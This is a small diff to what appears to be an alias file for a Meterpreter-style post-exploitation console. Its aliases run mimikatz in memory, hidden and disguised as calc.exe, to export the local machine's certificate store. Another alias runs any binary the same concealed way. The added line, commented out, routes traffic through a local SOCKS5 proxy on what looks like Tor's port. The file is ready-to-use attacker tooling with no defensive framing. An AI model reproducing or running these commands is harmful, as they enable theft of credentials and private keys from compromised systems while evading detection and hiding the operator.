@@ -13,3 +13,4 @@ alias -f j jobs -l -v
 alias -f ip ifconfig | grep "inet 192" | cut -d " " -f 2
 alias -f mimi execute -H -i -c -m -d calc.exe -f mimikatz.exe -a "'crypto::exportCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE" exit' 
 alias in_mem execute -H -i -c -m -d calc.exe -f
+# sockit -f setg Proxies SOCKS5:127.0.0.1:9050
